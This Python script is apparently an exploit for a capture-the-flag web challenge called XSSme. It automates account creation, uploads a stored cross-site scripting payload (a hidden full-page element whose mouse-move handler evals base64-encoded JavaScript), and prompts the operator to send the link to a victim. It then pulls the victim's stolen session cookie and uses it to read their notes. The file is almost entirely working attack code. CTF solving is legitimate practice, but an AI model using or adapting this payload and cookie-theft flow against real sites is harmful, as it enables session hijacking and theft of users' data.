import requests
import json
from base64 import b64encode
import random
from urllib.parse import quote as urlencode
from termcolor import colored
import argparse

# Function to log messages with color
def log(message, mode='info'):
    color = 'light_green' if mode == 'info' else 'red'
    print(colored(f"{message}\n", color))

# Function to create an account and return the cookie
def signup_and_signin(url):
    signup_url = f"{url}/singup"
    signin_url = f"{url}/singin"
    
    # Get headers from the base URL
    headers = requests.get(url).headers
    headers['Content-Type'] = 'application/x-www-form-urlencoded'
    
    # Generate a random username and password
    username = str(random.randint(10**12, 10**13 - 1))
    password = f"{username}_pass"
    data = f"username={username}&password={password}"
    
    # Sign up
    signup_response = requests.post(signup_url, data=data, headers=headers, allow_redirects=False)
    if signup_response.status_code == 302:
        log(f'Account Created\n Username: {username}\n Password: {password}')
        
        # Sign in
        signin_response = requests.post(signin_url, data=data, headers=headers)
        cookie = signin_response.headers.get('set-cookie')
        log(f'Cookie: {cookie}')
        return cookie
    else:
        log(f"Failed to Create Account\nResponse Code: {signup_response.status_code}", mode='error')
        exit(1)

# Function to generate XSS payload
def generate_xss_payload(victim, account_cookie):
    with open('exploit.js', 'rb') as f:
        html = f.read().replace(b'VICTIMNAME', victim.encode()).replace(b'ACCOUNTCOOKIEHERE', account_cookie.encode())
    
    payload = urlencode(f'''
        XX" id='hackme' style="width: 100vw; height: 100vh; opacity: 0; z-index: 1;" 
        onmousemove='eval(atob("{b64encode(html).decode()}"))'><!--
    '''.strip())
    return payload

# Function to upload the exploit
def upload_xss_exploit(url, payload, genre):
    headers = requests.get(url).headers
    headers['Content-Type'] = 'application/json'
    
    title = urlencode(payload)
    data = {
        'year': '2050',
        'episodes': 1000,
        'genre': genre,
        'rating': 122.9,
        'votes': 900
    }
    data_json = json.dumps(data)
    upload_url = f'{url}api/movie/{title}'
    
    response = requests.post(upload_url, data=data_json, headers=headers)
    if response.status_code == 201:
        log(f"Upload Successful: Status {response.status_code}", 'info')
        log(f"Exploit Link: {url}movie_information?catgory={genre}")
    else:
        log(f"Error Uploading: Status {response.status_code}", 'error')
        exit(1)

# Function to test the exploit
def test_exploit(url, account_cookie,getall=False):
    notes_url = f'{url}api/v1/notes/'
    headers = requests.get(url).headers
    headers['Content-Type'] = 'application/json'
    headers['Cookie'] = account_cookie
    
    response = requests.get(notes_url, headers=headers, allow_redirects=True)
    
    if response.ok:
        message = response.json().get('message', 'No message found')
        if isinstance(message,list):
            if not getall:
                log(f"FoundSession: {message[-1]}")
                return str(message[-1])
            else:
                log(message)
        else:
            log(message, 'info')
    else:
        log(f"Error fetching tester response: {response.status_code}", 'error')

# Functtion to seeFlag
def seeFlag(url,cookie,victimname):
    seeurl = url + '/api/v1/notes'
    header = requests.get(url).headers
    header['Cookie'] = str(cookie).replace(f"{victimname}: ",'')
    res = requests.get(seeurl,headers=header)
    if res.status_code == 200:
        notes = res.json().get('message')
        if isinstance(notes,list):
            for note in notes:
                log(f'{victimname}_Note: {note}')
        else:
            log(notes)
    else:
        log(f'Error: ResponsCode=>{res.status_code}','error')

def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Challenge Writeup Stage 1: Exploiting XSSme\nLink to the challenge: `https://github.dev/ShulkwiSEC/XSSme`")
    parser.add_argument('--url', type=str, required=True, help='The URL of the vulnerable web application')
    parser.add_argument('--victim', type=str, required=True, help='The victim name to save cookie with')
    parser.add_argument('--only-get', action='store_true', help='If specified, only execute the test_exploit function')
    parser.add_argument('--session', type=str, help='Session cookie required when --only-get is specified')
    parser.add_argument('--getall', action='store_true', help='Get all notes, not only the last added note; requires session cookie when --only-get is specified')
    args = parser.parse_args()
    
    url = args.url
    victim = args.victim

    if args.only_get:
        if args.session is None:
            parser.error("--session is required when --only-get is specified.")
        test_exploit(url, args.session,args.getall)
        return
    
    # Create an account and generate payload
    account_cookie = signup_and_signin(url)
    genre = random.randint(10**12, 10**13 - 1)
    payload = generate_xss_payload(victim, account_cookie)
    log(f"Payload Created: {payload}")

    # Upload the exploit
    upload_xss_exploit(url, payload, genre)

    # Wait for user input before sending the link
    input('Did you send the link to the victim? Press Enter to continue...')
    cookie = test_exploit(url, account_cookie)
    if cookie:
        seeFlag(url,cookie,victim)

if __name__ == "__main__":
    main()